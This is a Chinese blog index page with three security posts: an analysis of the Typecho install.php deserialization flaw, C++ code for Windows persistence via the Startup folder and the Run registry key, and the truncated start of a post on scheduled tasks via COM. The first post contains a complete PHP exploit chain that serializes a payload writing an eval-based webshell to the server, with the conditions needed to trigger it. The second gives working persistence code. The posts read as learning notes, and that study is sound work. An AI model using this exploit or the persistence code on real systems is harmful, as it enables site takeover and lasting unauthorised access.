<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-03T07:32:56.000Z" title="2021-03-03T07:32:56.000Z">2021-03-03</time>发表</span><span class="level-item"><time dateTime="2021-03-03T07:33:31.397Z" title="2021-03-03T07:33:31.397Z">2021-03-03</time>更新</span><span class="level-item">5 分钟读完 (大约812个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">typecho反序列化分析</a></h1><div class="content"><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.install.php</p>
<p>install.php中存在unserialize函数，__typecho_config可控。值被作为参数传入类Typecho_Db</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f366b28110700016f75f6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8d5d50a3-2fe6-4c8c-baaf-fabd0b3a1869.png" alt="imgbed.cn图床"></a></p>
<p>2./var/Typecho/Cookie.php</p>
<p>Typecho_Cookie::get方法从Cookie或者是POST数组中获取数据</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36733cfcc50001576f61"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e5924563-8b86-4d61-8ddc-bb46aaeea102.png" alt="imgbed.cn图床"></a></p>
<p>3./var/Typecho/Db.php</p>
<p>跟进类Typecho_Db,传入的参数被作为字符串拼接，触发__toString()，全局搜索toString</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f394ae9788300015e11ee"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/5eed6331-803d-4ef0-a608-5c6e74f41a63.png" alt="imgbed.cn图床"></a></p>
<p>4./var/Typecho/Feed.php中存在可利用toString方法</p>
<p>满足条件self::RSS2 == $this-&gt;_type执行下面的语句，如果$item[‘author’]是一个类，就会触发__get()方法，开始全局搜索get方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36877c46e800014fad42"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/02dedb11-1de4-4f60-9e43-b412f42870e7.png" alt="imgbed.cn图床"></a></p>
<p>5./var/Typecho/request.php</p>
<p>request.php中Typecho_Request类存在__get()方法，<code>__get</code>()含有一个参数，即要获取的成员属性的名称，$key=’screenName’</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f369b2ff44a0001828d25"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/03339ab0-a0e5-4f54-83b5-f3dde2d3489b.png" alt="imgbed.cn图床"></a></p>
<p>6.跟进get方法</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36ae91df94000121437f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/abc5d750-4cf6-444c-a8d2-64f33fd5f834.png" alt="imgbed.cn图床"></a></p>
<p>6.跟进<code>_applyFilter</code>方法，发现call_user_func函数，到达终点。filter属性为要执行的函数，$value来源为传入参数，在get函数中被<code>$value = $this-&gt;_params[$key]</code>赋值，来源于属性_params。<code>$this-&gt;_params[$key]</code>等于<code>$this-&gt;_params[&#39;screenName&#39;]</code></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36ba6df2d3000109c02c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4f2c37c1-923d-4950-83c4-b4592fd71c4a.png" alt="imgbed.cn图床"></a></p>
<h2 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h2><p>令Typecho_Db类中的$adapterName=$config[‘adapter’]等于Feed.php中的Typecho_Feed类，创建一个数组$a=array(‘adapter’ =&gt;new Typecho_Feed(),’prefix’ =&gt; ‘typecho_’)</p>
<p>令Typecho_Feed类中的$item[‘author’]等于Typecho_Request类</p>
<p>令Typecho_Request类中的属性<code>_params=array(&#39;screenName&#39;=&gt;&#39;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#39;a\&#39;]); ?&gt;&quot;)&#39;)</code></p>
<p>令Typecho_Request类中的属性_filter=array(‘assert’)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#x27;a\&#x27;]); ?&gt;&quot;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type=<span class="built_in">self</span>::RSS2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>]=<span class="keyword">array</span>(<span class="string">&#x27;author&#x27;</span>=&gt;<span class="keyword">new</span> Typecho_Request());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;adapter&#x27;</span> =&gt;<span class="keyword">new</span> Typecho_Feed(),<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>



<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>install.php中要求触发反序列化需要满足两个条件</p>
<p>必须有GET参数finish</p>
<p>Refer必须为本站链接，如<a target="_blank" rel="noopener" href="http://127.0.0.1/typecho">http://127.0.0.1/typecho</a></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36c61b484900018f385a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/736ce55e-b9e8-4ac4-81ad-822f44a1be51.png" alt="imgbed.cn图床"></a></p>
<h2 id="利用结果"><a href="#利用结果" class="headerlink" title="利用结果"></a>利用结果</h2><p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36cf91df9400012143b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4870195c-db40-4b0c-b73b-2511d30812bf.png" alt="imgbed.cn图床"></a></p>
<p>写入成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36ddb3108e0001913085"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8acf0548-facf-40cd-ae80-c616e44c718c.png" alt="imgbed.cn图床"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-01T13:10:37.000Z" title="2021-03-01T13:10:37.000Z">2021-03-01</time>发表</span><span class="level-item"><time dateTime="2021-03-01T13:11:27.253Z" title="2021-03-01T13:11:27.253Z">2021-03-01</time>更新</span><span class="level-item">5 分钟读完 (大约810个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">通过添加启动目录和和修改注册表进行权限维持</a></h1><div class="content"><h1 id="添加启动目录"><a href="#添加启动目录" class="headerlink" title="添加启动目录"></a>添加启动目录</h1><p>由于启动目录不固定，需要先通过SHGetSpecialFolderPath获取启动路径，再CopyFile把要自启动的程序复制过去</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj_core.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">wchar_t</span> StartupFolder[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">wchar_t</span> Path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	BOOL bRet= SHGetSpecialFolderPath(<span class="literal">NULL</span>, StartupFolder, CSIDL_STARTUP, FALSE);</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>, (LPWSTR)&amp;Path, MAX_PATH);</span><br><span class="line">	wcscat_s(StartupFolder, <span class="string">L&quot;\\Persistance.exe&quot;</span>);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, StartupFolder, <span class="string">L&quot;StartupFolder&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">if</span> (CopyFile(Path, StartupFolder, FALSE)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;succeed&quot;</span>, <span class="string">L&quot;succeed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>无需管理员权限即可修改HKEY_CURRENT_USER</p>
<p>在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中写入程序路径即可实现开机自启动</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加自身到注册表启动项</span></span><br><span class="line"><span class="function">BOOL <span class="title">Regpersist</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	LPCTSTR szRun = _T(<span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (RegOpenKeyEx(HKEY_CURRENT_USER, szRun, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hKey)</span><br><span class="line">		== ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">			TCHAR szFileName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">			DWORD dwRet = GetModuleFileName(<span class="literal">NULL</span>, szFileName, MAX_PATH);</span><br><span class="line">			AfxMessageBox(szFileName);</span><br><span class="line">			<span class="keyword">long</span> lRet = RegSetValueEx(hKey, _T(<span class="string">&quot;Login&quot;</span>), <span class="number">0</span>, REG_SZ, (BYTE*)szFileName, dwRet);</span><br><span class="line">			RegCloseKey(hKey);</span><br><span class="line">			<span class="keyword">if</span> (lRet != ERROR_SUCCESS)</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">		<span class="comment">//else	// 删除启动;</span></span><br><span class="line">		<span class="comment">//&#123;</span></span><br><span class="line">		<span class="comment">//	long lRet = RegDeleteValue(hKey, &quot;MFCLogin&quot;);</span></span><br><span class="line">		<span class="comment">//	RegCloseKey(hKey);</span></span><br><span class="line">		<span class="comment">//	if (lRet != ERROR_SUCCESS)</span></span><br><span class="line">		<span class="comment">//		return FALSE;</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">&quot;打开注册表失败&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	MessageBox(_T(<span class="string">&quot;添加成功&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h2><p>该api用来获取指定的系统路径 </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SHGetSpecialFolderPathA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HWND  hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR pszPath,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   csidl, <span class="comment">//CSIDL_STARTUP</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  fCreate</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegOpenKey"><a href="#RegOpenKey" class="headerlink" title="RegOpenKey"></a>RegOpenKey</h2><p>打开注册表，成功返回ERROR_SUCCESS</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegOpenKeyA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,   <span class="comment">//指定一个父键句柄  HKEY_CURRENT_USER </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey,<span class="comment">//指向一个字符串，表示要打开的子键名称,_T(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;)</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY  phkResult<span class="comment">//返回打开的子键句柄 &amp;hKey</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegCloseKey"><a href="#RegCloseKey" class="headerlink" title="RegCloseKey"></a>RegCloseKey</h2><p>关闭注册表，成功返回ERROR_SUCCESS</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegCloseKey</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey<span class="comment">//打开的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegQueryValueEx"><a href="#RegQueryValueEx" class="headerlink" title="RegQueryValueEx"></a>RegQueryValueEx</h2><p>注册表键值的查询</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegQueryValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY    hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpValueName,<span class="comment">//指定要被查询的键值的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,<span class="comment">//保留，始终NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,<span class="comment">//返回被查询的值的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  lpData,<span class="comment">//返回被查询数据的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData<span class="comment">//缓冲区长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>注册表键值的写入</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegSetValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY       hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄 HKEY_LOCAL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR     lpValueName,<span class="comment">//指定要被查询或写入的键值的名称 MFCLogin</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      Reserved,<span class="comment">//保留，始终为0   0</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      dwType,<span class="comment">//写入键值的类型   REG_SZ</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> BYTE *lpData,<span class="comment">//写入键值的缓冲区   路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cbData<span class="comment">//写入键值缓冲区的长度    sizeof</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegEnumValue"><a href="#RegEnumValue" class="headerlink" title="RegEnumValue"></a>RegEnumValue</h2><p>注册表键值的枚举</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegEnumValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY    hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwIndex,<span class="comment">//查询的索引值</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR   lpValueName,<span class="comment">//健名的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcchValueName,<span class="comment">//健名缓冲区的长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,<span class="comment">//保留，NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,<span class="comment">//返回被查询的值的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  lpData,<span class="comment">//被查询键值的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData<span class="comment">//被查询键值的缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegDeleteValue"><a href="#RegDeleteValue" class="headerlink" title="RegDeleteValue"></a>RegDeleteValue</h2><p>注册表键值的删除</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegDeleteValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpValueName<span class="comment">//指向欲删除的键值项的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="GetModuleFileName"><a href="#GetModuleFileName" class="headerlink" title="GetModuleFileName"></a>GetModuleFileName</h2><p>在开发过程中经常需要获得程序当前的运行目录，这时就可以使用GetModuleFileName</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">GetModuleFileName</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule,<span class="comment">//要获取文件名的模块名柄,null表示当前模块</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpFileName,<span class="comment">//输出参数，存放取得的文件名 TCHAR lpfilename</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nSize<span class="comment">//参数的长度     MAX_PATH</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-28T08:47:50.000Z" title="2021-02-28T08:47:50.000Z">2021-02-28</time>发表</span><span class="level-item"><time dateTime="2021-02-28T09:06:59.034Z" title="2021-02-28T09:06:59.034Z">2021-02-28</time>更新</span><span class="level-item">9 分钟读完 (大约1341个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">使用COM组件创建计划任务</a></h1><div class="content"><p>Windows系统可以设置计划任务来指向一些定时任务。本书中计划任务的触发条件是在用户登陆时触发，执行启动指定路径程序的操作</p>
<p>创建计划任务时涉及到COM组件接口的调用，要求管理员权限，程序逻辑概括为三个部分，分别是初始化操作、创建计划任务操作、删除计划任务操作。</p>
<h2 id="1-初始化操作"><a href="#1-初始化操作" class="headerlink" title="1.初始化操作"></a>1.初始化操作</h2><p>由于使用COM组件，所以必须调用CoInitialize函数来初始化COM接口环境，这样才能使用COM接口函数。同时也要先获取ITaskService对象指针以及ITaskFolder指针，这两个指针对象主要用来进行计划任务的创建操作。</p>
<p>1.CoInitialize初始化COM组件</p>
<p>2.CoCreateInstance创建任务服务对象</p>
<p>3.连接到任务服务</p>
